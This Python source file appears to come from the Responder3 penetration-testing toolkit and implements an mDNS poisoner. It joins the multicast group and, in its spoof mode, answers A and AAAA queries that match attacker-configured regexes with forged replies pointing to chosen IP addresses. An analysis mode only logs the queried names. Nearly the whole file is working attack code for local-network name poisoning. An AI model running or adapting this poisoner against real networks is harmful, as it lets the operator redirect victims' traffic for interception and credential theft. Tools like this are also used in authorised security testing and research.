
# https://tools.ietf.org/html/rfc6762
import re
import socket
import struct
import logging
import asyncio
import ipaddress
import traceback

from responder3.core.sockets import setup_base_socket
from responder3.core.commons import PoisonerMode, ResponderPlatform
from responder3.core.udpwrapper import UDPClient
from responder3.protocols.DNS import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession, ResponderServerGlobalSession


class MDNSGlobalSession(ResponderServerGlobalSession):
	def __init__(self, listener_socket_config, settings, log_queue):
		ResponderServerGlobalSession.__init__(self, log_queue, self.__class__.__name__)
		self.listener_socket_config = listener_socket_config
		self.settings = settings

		self.spooftable = []
		self.poisonermode = PoisonerMode.ANALYSE

		self.maddr = ('224.0.0.251' , self.listener_socket_config.bind_port)
		if self.listener_socket_config.bind_addr.version == 6:
			self.maddr = ('FF02::FB' , self.listener_socket_config. bind_port,0, self.listener_socket_config.bind_iface_idx)

		self.parse_settings()

	def parse_settings(self):
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.poisonermode = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.poisonermode == PoisonerMode.SPOOF:
				for exp in self.settings['spooftable']:
					self.spooftable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))


class MDNSSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)


class MDNS(ResponderServer):

	@staticmethod
	def custom_socket(socket_config):
		if socket_config.bind_family == 4:
			mcast_addr = ipaddress.ip_address('224.0.0.251')
			sock = setup_base_socket(
				socket_config,
				bind_ip_override = ipaddress.ip_address('0.0.0.0') if socket_config.platform == ResponderPlatform.WINDOWS else None
			)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
			mreq = struct.pack("=4sl", mcast_addr.packed, socket.INADDR_ANY)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)		

		else:
			mcast_addr = ipaddress.ip_address('FF02::FB')
			sock = setup_base_socket(
				socket_config,
				bind_ip_override = ipaddress.ip_address('::') if socket_config.platform == ResponderPlatform.WINDOWS else None
			)
			sock.setsockopt(
				41 if socket_config.platform == ResponderPlatform.WINDOWS else socket.IPPROTO_IPV6,
				socket.IPV6_JOIN_GROUP,
				struct.pack('16sI', mcast_addr.packed, socket_config.bind_iface_idx)
			)
			
		return sock

	def init(self):
		self.parser = DNSPacket

	async def parse_message(self):
		msg = await asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	async def send_data(self, data, addr):
		# we need to set the addr here, because we are sending the packet to the multicast address, not to the clinet itself
		# however there could be cases that the client accepts unicast, but it's ignored for now
		await asyncio.wait_for(self.cwriter.write(data, addr), timeout=1)
		return
	
	async def run(self):
		try:
			msg = await asyncio.wait_for(self.parse_message(), timeout=1)
			if msg.QR == DNSResponse.REQUEST:
				if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
					for q in msg.Questions:
						await self.log_poisonresult(requestName = q.QNAME.name)
				else:
					answers = []
					for targetRE, ip in self.globalsession.spooftable:
						for q in msg.Questions:
							if q.QTYPE == DNSType.A or q.QTYPE == DNSType.AAAA:
								if targetRE.match(q.QNAME.name):
									await self.log_poisonresult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
									#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
									if ip.version == 4:
										res = DNSAResource.construct(q.QNAME.name, ip)
									elif ip.version == 6:
										res = DNSAAAAResource.construct(q.QNAME.name, ip)
									else:
										raise Exception('This IP version scares me...')
									#res.construct(q.QNAME, NBRType.NB, ip)
									answers.append(res)
					
					response = DNSPacket.construct(TID = b'\x00\x00', 
													 response  = DNSResponse.RESPONSE, 
													 answers   = answers
													 )

					await asyncio.wait_for(self.send_data(response.to_bytes(), self.globalsession.maddr), timeout=1)

		except Exception as e:
			raise e